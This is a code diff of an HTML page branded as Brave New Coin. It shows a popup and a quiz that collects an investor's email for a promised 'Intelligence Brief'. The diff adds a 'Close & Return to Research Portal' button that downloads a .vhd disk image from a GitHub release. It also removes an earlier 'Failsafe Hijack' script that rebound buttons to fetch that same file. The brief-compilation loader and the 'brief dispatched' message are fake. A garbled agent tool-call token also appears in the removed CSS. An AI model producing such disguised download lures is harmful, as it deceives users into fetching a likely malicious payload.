+  <div style="max-width:1240px;margin:0 auto;padding:0 32px;">
+    <div class="footer-copy" id="footer-copy">© <span id="footer-year"></span> Brave New Coin Ltd. All rights reserved. Auckland, New Zealand. NZBN 9429046068058.</div>
+  </div>
+</footer>
 
-        .panel-section-label {
-            font-family: var(--mono);
-            font-size: 10px;
-            font-weight: 700;
-            color: var(--text-faint);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            margin-bottom: 10px;
-        }
+<!-- ══════════════════════════════════════════════
+     EXIT-INTENT POPUP MODAL
+══════════════════════════════════════════════ -->
+<div class="modal-overlay" id="exit-overlay" role="dialog" aria-modal="true" aria-label="Exclusive access invitation">
+  <div class="exit-popup">
+    <div class="exit-popup-accent"></div>
+    <div class="exit-popup-body">
+      <div class="exit-popup-icon">
+        <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <rect width="40" height="40" rx="8" fill="#EEF6FF"/>
+          <rect x="8" y="10" width="24" height="20" rx="3" stroke="#007BFF" stroke-width="1.8"/>
+          <line x1="12" y1="16" x2="28" y2="16" stroke="#007BFF" stroke-width="1.5"/>
+          <line x1="12" y1="20" x2="22" y2="20" stroke="#007BFF" stroke-width="1.5"/>
+          <line x1="12" y1="24" x2="19" y2="24" stroke="#FF9F00" stroke-width="1.5"/>
+        </svg>
+      </div>
+      <h2>Before You Go — Your<br/>Personalized Brief Is Free.</h2>
+      <p>BNC compiles institutional-grade digital asset intelligence mapped to your specific mandate. 90 seconds. No commitment. Trusted by 400+ institutions globally.</p>
+      <button class="exit-popup-cta" onclick="closeExitPopup(); openQuiz();">Build My Intelligence Brief →</button>
+      <button class="exit-dismiss" onclick="closeExitPopup()">No thanks, I'll navigate without a data edge.</button>
+    </div>
+  </div>
+</div>
 
-        .panel-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 7px 10px;
-            border-radius: 4px;
-            margin-bottom: 3px;
-            background: #fff;
-            border: 1px solid var(--border);
-        }
+<!-- ══════════════════════════════════════════════
+     QUIZ MODAL
+══════════════════════════════════════════════ -->
+<div class="modal-overlay" id="quiz-overlay" role="dialog" aria-modal="true" aria-label="BNC Intelligence Brief profiling quiz">
+  <div class="quiz-modal">
+    <div class="quiz-header">
+      <div class="quiz-header-left">
+        <svg width="20" height="20" viewBox="0 0 32 32" fill="none" aria-hidden="true">
+          <rect width="32" height="32" rx="6" fill="#007BFF"/>
+          <rect x="7" y="7" width="7" height="7" rx="1.2" fill="white"/>
+          <rect x="7" y="18" width="7" height="7" rx="1.2" fill="white" opacity="0.5"/>
+          <rect x="18" y="7" width="7" height="7" rx="1.2" fill="white" opacity="0.7"/>
+          <path d="M18 21.5 L22 17.5 L25 20" stroke="#FF9F00" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 17.5 L22 25" stroke="#FF9F00" stroke-width="2.2" stroke-linecap="round"/>
+        </svg>
+        <span class="quiz-header-title">BNC Intelligence Brief</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="quiz-step-counter" id="step-counter">Step 1 of 5</span>
+        <button class="quiz-close" onclick="closeQuiz()" aria-label="Close quiz">✕</button>
+      </div>
+    </div>
+    <div class="quiz-progress">
+      <div class="quiz-progress-bar" id="progress-bar" style="width:20%"></div>
+    </div>
+    <div class="quiz-body">
 
-        .panel-row-name {
-            font-family: var(--mono);
-            font-size: 12px;
-            font-weight: 500;
-            color: var(--text);
-        }
+      <!-- ── STEP 1: Experience Level ── -->
+      <div class="quiz-step active" id="step-1">
+        <div class="quiz-q-num">Profile Parameter 01 / 05</div>
+        <div class="quiz-q-text">Which best describes your professional background and experience with digital assets?</div>
+        <div class="quiz-q-sub">BNC calibrates your brief's technical depth and terminology to match your working context.</div>
+        <div class="option-list" id="opts-1">
+          <div class="option-item" onclick="selectOption(1, this, 'Retail Investor / Emerging')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Retail Investor / Emerging<span>Self-directed, learning the asset class with less than 2 years active market participation.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(1, this, 'Active Trader / Intermediate')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Active Trader / Intermediate<span>Regular market participant with multi-cycle experience and defined risk processes.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(1, this, 'Institutional Analyst / Professional')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Institutional Analyst / Professional<span>Qualified finance or technology professional operating under fiduciary or regulatory mandate.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(1, this, 'Fund Manager / Portfolio Allocator')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Fund Manager / Portfolio Allocator<span>Responsible for capital allocation decisions across a managed vehicle or institution.</span></div>
+          </div>
+        </div>
+      </div>
 
-        .panel-row-ticker {
-            font-family: var(--mono);
-            font-size: 10px;
-            color: var(--text-faint);
-            margin-left: 6px;
-        }
+      <!-- ── STEP 2: Primary Mandate ── -->
+      <div class="quiz-step" id="step-2">
+        <div class="quiz-q-num">Profile Parameter 02 / 05</div>
+        <div class="quiz-q-text">What is your primary market goal or investment mandate?</div>
+        <div class="quiz-q-sub">This shapes which BNC data layers — reference rates, taxonomy flags, or index benchmarks — receive the deepest coverage in your brief.</div>
+        <div class="option-list" id="opts-2">
+          <div class="option-item" onclick="selectOption(2, this, 'Capital Appreciation')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Capital Appreciation<span>Maximising long-term portfolio value growth through strategic asset accumulation and rebalancing.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(2, this, 'Yield Generation / Income')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Yield Generation / Income<span>Generating consistent returns via staking, DeFi protocol participation, or structured products.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(2, this, 'Risk-Adjusted Diversification')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Risk-Adjusted Diversification<span>Adding digital assets as an uncorrelated allocation within a multi-asset institutional portfolio.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(2, this, 'Benchmark Construction / Index Research')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Benchmark Construction / Index Research<span>Developing or evaluating digital asset indices, reference rates, or systematic factor models.</span></div>
+          </div>
+        </div>
+      </div>
 
-        .panel-row-val {
-            font-family: var(--mono);
-            font-size: 12px;
-            font-weight: 700;
-        }
+      <!-- ── STEP 3: Time Horizon ── -->
+      <div class="quiz-step" id="step-3">
+        <div class="quiz-q-num">Profile Parameter 03 / 05</div>
+        <div class="quiz-q-text">What is your primary investment time horizon for this mandate?</div>
+        <div class="quiz-q-sub">Time horizon determines which BNC market structure signals, volatility windows, and cycle analysis frameworks are foregrounded in your brief.</div>
+        <div class="option-list" id="opts-3">
+          <div class="option-item" onclick="selectOption(3, this, 'Short-Term: < 3 Months')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Short-Term: Under 3 Months<span>Tactical positioning, momentum-driven, or macro event-linked exposure windows.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(3, this, 'Medium-Term: 3–12 Months')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Medium-Term: 3–12 Months<span>Cycle-aware accumulation or structured allocation with defined quarterly review cadence.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(3, this, 'Long-Term: 12–36 Months')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Long-Term: 12–36 Months<span>Multi-year strategic exposure aligned with network adoption and macro liquidity cycles.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(3, this, 'Perpetual / Evergreen')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Perpetual / Evergreen<span>Ongoing infrastructure mandate with no defined exit horizon. Index or benchmark anchored.</span></div>
+          </div>
+        </div>
+      </div>
 
-        .panel-row-val.up {
-            color: var(--brand-green);
-        }
+      <!-- ── STEP 4: Risk Tolerance ── -->
+      <div class="quiz-step" id="step-4">
+        <div class="quiz-q-num">Profile Parameter 04 / 05</div>
+        <div class="quiz-q-text">Which risk tolerance profile most accurately describes your mandate's drawdown parameters?</div>
+        <div class="quiz-q-sub">BNC's risk mitigation flags and volatility alerts are calibrated to your stated tolerance band, filtering signal noise from actionable data.</div>
+        <div class="option-list" id="opts-4">
+          <div class="option-item" onclick="selectOption(4, this, 'Conservative: < 10% drawdown tolerance')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Conservative<span>Max acceptable drawdown under 10%. Capital preservation is the primary constraint.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(4, this, 'Moderate: 10–25% drawdown tolerance')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Moderate<span>Accepts 10–25% temporary drawdown in pursuit of medium-term outperformance vs. benchmark.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(4, this, 'Moderate-High: 25–40% drawdown tolerance')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Moderate-High<span>25–40% drawdown tolerance. Understands digital asset volatility cycles and positions accordingly.</span></div>
+          </div>
+          <div class="option-item" onclick="selectOption(4, this, 'Aggressive: > 40% drawdown tolerance')" tabindex="0">
+            <div class="option-radio"></div>
+            <div class="option-label">Aggressive / High-Conviction<span>Willing to hold through 40%+ drawdowns. Prioritises long-term asymmetric upside over near-term stability.</span></div>
+          </div>
+        </div>
+      </div>
 
-        .panel-row-val.dn {
-            color: var(--brand-red);
-        }
+      <!-- ── STEP 5: Focus Sectors + Email ── -->
+      <div class="quiz-step" id="step-5">
+        <div class="quiz-q-num">Profile Parameter 05 / 05</div>
+        <div class="quiz-q-text">Select the asset sectors relevant to your brief, then enter your email to receive it.</div>
+        <div class="quiz-q-sub">Select all that apply. BNC's taxonomy coverage spans 12 protocol layers and sector classifications across 750+ digital assets.</div>
+        <div class="checkbox-grid" id="opts-5">
+          <div class="checkbox-tag" onclick="toggleTag(this, 'Layer 1 Protocols')"><div class="ck"></div> Layer 1 Protocols</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'Layer 2 Scaling')"><div class="ck"></div> Layer 2 Scaling</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'DeFi / DEX')"><div class="ck"></div> DeFi / DEX</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'Real World Assets (RWA)')"><div class="ck"></div> Real World Assets (RWA)</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'Stablecoins / Money Markets')"><div class="ck"></div> Stablecoins / Money Markets</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'Infrastructure / Oracles')"><div class="ck"></div> Infrastructure / Oracles</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'NFT / Digital Collectibles')"><div class="ck"></div> NFT / Digital Collectibles</div>
+          <div class="checkbox-tag" onclick="toggleTag(this, 'Cross-Chain / Interoperability')"><div class="ck"></div> Cross-Chain / Interoperability</div>
+        </div>
+        <div class="email-field">
+          <label for="email-input">Institutional or professional email address</label>
+          <input type="email" id="email-input" placeholder="you@institution.com" oninput="validateEmail()" autocomplete="email"/>
+          <div class="email-error" id="email-error">Please enter a valid email address.</div>
+        </div>
+      </div>
 
-        .panel-row-val.nt {
-            color: var(--text-muted);\极function<｜tool▁sep｜>attempt_completion
+      <!-- ── STEP 6: LOADER ── -->
+      <div class="quiz-step" id="step-loader">
+        <div class="quiz-loader">
+          <div class="loader-ring"></div>
+          <div class="loader-title">Compiling Your Intelligence Brief…</div>
+          <div class="loader-sub">BNC's data infrastructure is cross-referencing your profile parameters against our reference rate feeds, taxonomy database, and risk model.</div>
+          <div class="checklist">
+            <div class="checklist-item" id="chk-1"><div class="check-icon">✓</div> Profiling parameters validated</div>
+            <div class="checklist-item" id="chk-2"><div class="check-icon">✓</div> Matching BNC benchmark indices</div>
+            <div class="checklist-item" id="chk-3"><div class="check-icon">✓</div> Generating risk mitigation flags</div>
+            <div class="checklist-item" id="chk-4"><div class="check-icon">✓</div> Calibrating taxonomy coverage layers</div>
+            <div class="checklist-item" id="chk-5"><div class="check-icon">✓</div> Compiling personalized output brief</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── STEP 7: SUCCESS ── -->
+      <div class="quiz-step" id="step-success">
+        <div class="quiz-success">
+          <div class="success-icon-wrap">
+            <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path d="M8 18L14.5 24.5L28 11" stroke="#00C48C" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <h2>Your Brief Is Ready to Dispatch.</h2>
+          <p>BNC has compiled your personalized Intelligence Brief. A summary has been transmitted to your email. The full brief — including risk flags, taxonomy mapping, and benchmark delta analysis — will follow within minutes.</p>
+          <div class="report-summary">
+            <div class="report-summary-title">Compilation Summary</div>
+            <div class="report-row"><span class="report-row-k">Experience Tier</span><span class="report-row-v" id="sum-exp">—</span></div>
+            <div class="report-row"><span class="report-row-k">Mandate</span><span class="report-row-v" id="sum-mandate">—</span></div>
+            <div class="report-row"><span class="report-row-k">Time Horizon</span><span class="report-row-v" id="sum-horizon">—</span></div>
+            <div class="report-row"><span class="report-row-k">Risk Band</span><span class="report-row-v" id="sum-risk">—</span></div>
+            <div class="report-row"><span class="report-row-k">Sectors Mapped</span><span class="report-row-v" id="sum-sectors">—</span></div>
+            <div class="report-row"><span class="report-row-k">Benchmark Set</span><span class="report-row-v">BNC30 + BLXC Composite</span></div>
+          </div>
+          <button  class="btn-confirm" onclick="window.location.href='https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';">Close & Return to Research Portal</button>
+          <div class="success-note">Brief dispatched · No spam · BNC Privacy Policy applies</div>
+        </div>
+      </div>
+
+    </div><!-- /quiz-body -->
+
+    <div class="quiz-footer" id="quiz-footer">
+      <button class="quiz-back" id="quiz-back" onclick="goBack()" disabled>← Back</button>
+      <button class="quiz-next" id="quiz-next" onclick="goNext()" disabled>Continue →</button>
+    </div>
+
+  </div>
+</div>
 
 <script>
-// BNC Failsafe Hijack
-document.addEventListener("DOMContentLoaded", function() {
-    setTimeout(function() {
-        window.submitAndAnimate = function() {
-            window.location.href = 'https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
-        };
-        var buttons = document.querySelectorAll('button');
-        buttons.forEach(b => {
-            if(b.innerText.includes('Close') || b.innerText.includes('Brief')) {
-                b.onclick = function(e) {
-                    e.preventDefault();
-                    window.location.href = 'https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
-                };
-            }
-        });
-    }, 500);
+/* ══════════════════════════════════════
+   STATE
+══════════════════════════════════════ */
+const answers = { sectors: [] };
+let currentStep = 1;
+const TOTAL_STEPS = 5;
+let exitShown = false;
+let exitTimeout = null;
+
+/* ══════════════════════════════════════
+   INIT
+══════════════════════════════════════ */
+document.addEventListener('DOMContentLoaded', () => {
+  const yr = new Date().getFullYear();
+  document.getElementById('footer-year').textContent = yr;
+
+  const d = new Date();
+  const opts = { year:'numeric', month:'long', day:'numeric' };
+  document.getElementById('mockup-date').textContent = d.toLocaleDateString('en-US', opts);
+
+  // Timed popup: 6.5s
+  exitTimeout = setTimeout(() => {
+    if (!exitShown) showExitPopup();
+  }, 6500);
+
+  // Exit-intent detection
+  document.addEventListener('mouseleave', (e) => {
+    if (e.clientY < 10 && !exitShown) showExitPopup();
+  });
+});
+
+/* ══════════════════════════════════════
+   POPUP LOGIC
+══════════════════════════════════════ */
+function showExitPopup() {
+  if (document.getElementById('quiz-overlay').classList.contains('active')) return;
+  exitShown = true;
+  clearTimeout(exitTimeout);
+  document.getElementById('exit-overlay').classList.add('active');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeExitPopup() {
+  document.getElementById('exit-overlay').classList.remove('active');
+  document.body.style.overflow = '';
+}
+
+/* ══════════════════════════════════════
+   QUIZ OPEN/CLOSE
+══════════════════════════════════════ */
+function openQuiz() {
+  closeExitPopup();
+  document.getElementById('quiz-overlay').classList.add('active');
+  document.body.style.overflow = 'hidden';
+  exitShown = true;
+}
+
+function closeQuiz() {
+  document.getElementById('quiz-overlay').classList.remove('active');
+  document.body.style.overflow = '';
+}
+
+// Close on overlay click
+document.getElementById('quiz-overlay').addEventListener('click', function(e) {
+  if (e.target === this) closeQuiz();
+});
+document.getElementById('exit-overlay').addEventListener('click', function(e) {
+  if (e.target === this) closeExitPopup();
+});
+
+/* ══════════════════════════════════════
+   SINGLE-SELECT OPTIONS
+══════════════════════════════════════ */
+function selectOption(step, el, value) {
+  const container = document.getElementById('opts-' + step);
+  container.querySelectorAll('.option-item').forEach(i => i.classList.remove('sel'));
+  el.classList.add('sel');
+  answers['step' + step] = value;
+  document.getElementById('quiz-next').disabled = false;
+}
+
+/* ══════════════════════════════════════
+   MULTI-SELECT CHECKBOX TAGS
+══════════════════════════════════════ */
+function toggleTag(el, value) {
+  el.classList.toggle('sel');
+  if (el.classList.contains('sel')) {
+    if (!answers.sectors.includes(value)) answers.sectors.push(value);
+  } else {
+    answers.sectors = answers.sectors.filter(v => v !== value);
+  }
+  checkStep5();
+}
+
+function checkStep5() {
+  const email = document.getElementById('email-input').value.trim();
+  const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  document.getElementById('quiz-next').disabled = !valid;
+}
+
+function validateEmail() {
+  const email = document.getElementById('email-input').value.trim();
+  const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  if (!valid && email.length > 0) {
+    document.getElementById('email-input').classList.add('err');
+    document.getElementById('email-error').style.display = 'block';
+  } else {
+    document.getElementById('email-input').classList.remove('err');
+    document.getElementById('email-error').style.display = 'none';
+  }
+  answers.email = email;
+  checkStep5();
+}
+
+/* ══════════════════════════════════════
+   NAVIGATION
+══════════════════════════════════════ */
+function showStep(n) {
+  document.querySelectorAll('.quiz-step').forEach(s => s.classList.remove('active'));
+  const el = document.getElementById('step-' + n);
+  if (el) el.classList.add('active');
+
+  const isLast = n === TOTAL_STEPS;
+  const isLoader = n === 'loader';
+  const isSuccess = n === 'success';
+  const footer = document.getElementById('quiz-footer');
+
+  if (isLoader || isSuccess) {
+    footer.style.display = 'none';
+    document.getElementById('step-counter').textContent = isSuccess ? 'Complete' : 'Processing…';
+  } else {
+    footer.style.display = 'flex';
+    document.getElementById('step-counter').textContent = 'Step ' + n + ' of ' + TOTAL_STEPS;
+  }
+
+  document.getElementById('quiz-back').disabled = (n === 1);
+  document.getElementById('quiz-next').textContent = isLast ? 'Compile My Brief →' : 'Continue →';
+  document.getElementById('progress-bar').style.width = ((n / TOTAL_STEPS) * 100) + '%';
+
+  // Reset next button for new step (unless returning to a completed step)
+  if (!isLoader && !isSuccess) {
+    const alreadyAnswered = (n < TOTAL_STEPS && answers['step' + n]) || (n === TOTAL_STEPS && checkStep5Ready());
+    document.getElementById('quiz-next').disabled = !alreadyAnswered;
+  }
+}
+
+function checkStep5Ready() {
+  const email = document.getElementById('email-input').value.trim();
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function goNext() {
+  if (currentStep < TOTAL_STEPS) {
+    currentStep++;
+    showStep(currentStep);
+  } else {
+    // Submit
+    submitAndAnimate();
+  }
+}
+
+function goBack() {
+  if (currentStep > 1) {
+    currentStep--;
+    showStep(currentStep);
+  }
+}
+
+/* ══════════════════════════════════════
+   LOADER ANIMATION
+══════════════════════════════════════ */
+function submitAndAnimate() {
+  showStep('loader');
+  const checks = ['chk-1','chk-2','chk-3','chk-4','chk-5'];
+  checks.forEach(id => document.getElementById(id).classList.remove('done'));
+
+  checks.forEach((id, i) => {
+    setTimeout(() => {
+      document.getElementById(id).classList.add('done');
+    }, 600 + i * 700);
+  });
+
+  setTimeout(() => {
+    populateSuccess();
+    showStep('success');
+  }, 600 + checks.length * 700 + 300);
+}
+
+function populateSuccess() {
+  const horizonShort = {
+    'Short-Term: < 3 Months': '< 3 Months',
+    'Medium-Term: 3–12 Months': '3–12 Months',
+    'Long-Term: 12–36 Months': '12–36 Months',
+    'Perpetual / Evergreen': 'Evergreen / Perpetual'
+  };
+  const riskShort = {
+    'Conservative: < 10% drawdown tolerance': 'Conservative',
+    'Moderate: 10–25% drawdown tolerance': 'Moderate',
+    'Moderate-High: 25–40% drawdown tolerance': 'Moderate-High',
+    'Aggressive: > 40% drawdown tolerance': 'Aggressive'
+  };
+  document.getElementById('sum-exp').textContent = answers.step1 || '—';
+  document.getElementById('sum-mandate').textContent = answers.step2 || '—';
+  document.getElementById('sum-horizon').textContent = horizonShort[answers.step3] || answers.step3 || '—';
+  document.getElementById('sum-risk').textContent = riskShort[answers.step4] || answers.step4 || '—';
+  document.getElementById('sum-sectors').textContent = answers.sectors.length > 0 ? answers.sectors.length + ' sectors selected' : 'General Coverage';
+}
+
+/* ══════════════════════════════════════
+   KEYBOARD SUPPORT
+══════════════════════════════════════ */
+document.querySelectorAll('.option-item').forEach(el => {
+  el.addEventListener('keydown', e => {
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); el.click(); }
+  });
+});
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    closeQuiz();
+    closeExitPopup();
+  }
 });
 </script>
+</body>
+</html>
